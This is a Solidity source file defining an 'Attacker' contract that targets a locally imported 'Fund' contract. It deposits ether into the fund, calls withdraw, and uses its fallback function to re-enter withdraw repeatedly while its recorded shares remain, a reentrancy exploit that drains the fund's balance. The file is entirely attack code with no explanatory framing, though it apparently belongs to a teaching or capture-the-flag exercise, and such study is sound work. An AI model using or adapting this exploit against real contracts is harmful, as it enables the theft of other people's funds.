// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Fund} from "./Fund.sol";

contract Attacker {
    Fund private _fund;

    constructor(address fundAddr) payable {
        _fund = Fund(fundAddr);
    }

    function depositToFund() public payable {
        _fund.deposit{value: address(this).balance}();
    }

    function attack() public {
        _fund.withdraw();
    }

    fallback() external payable {
        uint256 myBalanceInFund = _fund.shares(address(this));
        uint256 fundBalance = address(_fund).balance;

        if (myBalanceInFund > 0 && myBalanceInFund <= fundBalance) {
            _fund.withdraw();
        }
    }
}
